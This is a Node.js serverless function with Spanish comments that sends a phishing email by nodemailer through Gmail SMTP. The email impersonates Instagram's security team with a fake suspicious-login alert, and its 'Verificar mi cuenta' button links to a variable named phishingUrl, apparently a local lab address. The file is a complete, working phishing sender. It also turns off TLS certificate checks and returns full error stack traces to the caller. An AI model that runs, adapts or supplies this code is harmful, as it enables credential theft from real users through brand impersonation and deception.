require('dotenv').config();
const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Método no permitido' };
  }

  try {
    const { targetEmail } = JSON.parse(event.body);
    
    // Debug de variables de entorno (quitar en producción)
    console.log('EMAIL_USER:', process.env.EMAIL_USER);
    console.log('EMAIL_PASS length:', process.env.EMAIL_PASS?.length);

    const user = process.env.SMTP_USER;
    const pass = process.env.SMTP_PASS;

    if (!user || !pass) {
      throw new Error('Faltan credenciales de email en variables de entorno');
    }

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: user,
        pass: pass
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    // Verificar conexión
    await transporter.verify();
    console.log('Conexión SMTP verificada');

    const phishingUrl = 'http://192.168.56.1:3000';

    const mailOptions = {
      from: `"Seguridad de Instagram" <${user}>`,
      to: targetEmail,
      subject: 'Alerta de seguridad: Actividad sospechosa detectada',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="margin: 20px 0;">
          <h2>Actividad sospechosa detectada</h2>
          <p>Hola,</p>
          <p>Hemos detectado un intento de inicio de sesión sospechoso en tu cuenta de Instagram desde una nueva ubicación:</p>
          <ul style="color: #666;">
            <li>Fecha: ${new Date().toLocaleString()}</li>
            <li>Ubicación: Madrid, España</li>
            <li>Dispositivo: iPhone</li>
          </ul>
          <p>Si no fuiste tú, por favor verifica tu cuenta inmediatamente:</p>
          <div style="margin: 30px 0;">
            <a href="${phishingUrl}" 
               style="background-color: #0095f6; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; font-weight: bold;">
              Verificar mi cuenta
            </a>
          </div>
          <p style="color: #666; font-size: 12px;">
            Si no realizaste esta acción, ignora este correo. 
            <br>Para más información sobre la seguridad de tu cuenta, visita el Centro de ayuda.
          </p>
          <hr style="margin: 20px 0; border: none; border-top: 1px solid #eee;">
          <p style="color: #666; font-size: 12px;">© Instagram from Meta</p>
        </div>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    console.log('Correo enviado:', info.messageId);

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        message: 'Email enviado exitosamente',
        sentTo: targetEmail,
        messageId: info.messageId
      })
    };
  } catch (error) {
    console.error('Error detallado:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        error: 'Error al enviar el email',
        details: error.message,
        stack: error.stack
      })
    };
  }
}; 